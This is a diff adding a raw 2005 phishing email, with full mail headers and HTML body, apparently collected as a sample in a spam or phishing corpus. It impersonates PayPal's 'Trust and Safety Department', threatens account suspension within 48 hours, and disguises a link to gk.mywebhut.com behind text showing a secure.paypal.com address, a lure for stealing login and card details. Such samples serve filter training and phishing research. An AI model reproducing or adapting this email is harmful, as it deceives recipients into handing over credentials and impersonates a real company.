@@ -1,0 +1,107 @@
+Return-Path: <aw-confirm@paypal.com>
+X-Original-To: username@login.domain.com
+Delivered-To: username@login.domain.com
+Received: from mail2.domain.com (mail2.domain.com [192.168.3.4])
+	by naughty.domain.com (Postfix) with ESMTP id 6765C536E1F
+	for <username@login.domain.com>; Thu, 28 Jul 2005 09:22:53 -0400 (EDT)
+Received: from web.ozdns.biz (72-29-69-67.dimenoc.com [72.29.69.67])
+	by mail2.domain.com (Postfix) with ESMTP id 1FE9A18386F
+	for <username@domain.com>; Thu, 28 Jul 2005 09:22:53 -0400 (EDT)
+Received: from localhost ([127.0.0.1]:54101 helo=www.businesscharlestown.org.au)
+	by web.ozdns.biz with esmtp (Exim 4.50)
+	id 1Dy8Ki-0008OP-W8
+	for username@domain.com; Thu, 28 Jul 2005 23:21:57 +1000
+Date: Thu, 28 Jul 2005 23:21:56 +1000
+To: "username@domain.comr" <username@domain.com>
+From: PayPal Security Validation <aw-confirm@paypal.com>
+Subject: Your PayPal Account Could be Suspended
+Message-ID: <6e9a0035245cda7f657774ff263c764b@www.businesscharlestown.org.au>
+X-Priority: 3
+X-Mailer: PHPMailer [version 1.72]
+MIME-Version: 1.0
+Content-Transfer-Encoding: 8bit
+Content-Type: text/html; charset="iso-8859-1"
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - web.ozdns.biz
+X-AntiAbuse: Original Domain - domain.com
+X-AntiAbuse: Originator/Caller UID/GID - [0 0] / [47 12]
+X-AntiAbuse: Sender Address Domain - paypal.com
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Keywords:                  
+X-UID: 148
+Status: O
+Content-Length: 3011
+Lines: 69
+
+<head>
+<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>Dear PayPal user</title>
+</head>
+
+<body>
+
+<span class="ebay">
+<table cellSpacing="0" cellPadding="0" width="100%" border="0" dir="ltr">
+    <td><A target="_blank"  href="https://www.paypal.com/us" ><IMG
+src="http://www.mjeshtri.org/pp.gif"  alt="PayPal"
+border="0"><br>
+  </tr>
+</table>
+
+<font color="#003366" size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong> 
+<p dir="ltr"><b>Dear PayPal User, </b><br></strong></font>
+<br>
+<font size="2" face="Verdana, Arial, Helvetica, sans-serif">
+In Due to recent account takeovers , PayPal is introducing a 
+new account verification method. From time to time, randomly 
+selected accounts are subjected to an advanced verification process
+based on our merchant accounts/bank relations and customers credit card.
+PayPal may also request in an email message scanned/faxed copies of one or 
+more photo ID's. Your account confirmation may go wrong if your credit card/bank
+account is expired, or if you have changed your credit card number, billing 
+address etc. without notifying us about the change. 
+Your account is not suspended, but if in 48 hours after you receive this message 
+your information is not confirmed we reserve the right to suspend your PayPal 
+account. If you received this notice and you are not the authorized account 
+holder, please be aware that it is in violation of PayPal policy to represent 
+oneself as another PayPal user. Such action may also be in violation of local, 
+national, and/or international law. PayPal is committed to assist law enforcement
+with any inquires related to attempts to misappropriate personal information 
+with the intent to commit fraud or theft. Information will be provided at the
+request of law enforcement agencies to ensure that perpetrators are prosecuted 
+to the full extent of the law.<br> 
+
+<br>
+<font color="#003366" size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong> 
+<b>To confirm your identity with us click here: <br>
+<a href="http://gk.mywebhut.com/index.htm">
+http://secure.paypal.com/login-cgi/paypalsession?login</a></b></font>
+
+<br>
+<br>
+<font size="2" face="Verdana, Arial, Helvetica, sans-serif">
+Respectfully, <br>
+Trust and Safety Department <br>
+Thank you for using PayPal!<br>
+The PayPal Team </p>
+
+  <tr>
+   
+<td align="left" valign="top"><font color="#999999" size="1" face="Verdana, Arial, Helvetica, sans-serif">Please 
+            do not reply to this e-mail. Mail sent to this address cannot be answered. 
+            For assistance, log in to your PayPal account and choose the "Help" 
+            link in the footer of any page. </font> 
+            <p><font size="1"><font color="#999999" face="Verdana, Arial, Helvetica, sans-serif">PayPal 
+              Email ID PP126</font></font></p>
+        </tr>
+      </table> </td>
+  </tr>
+</table>
+</body>
+</html>
+
+
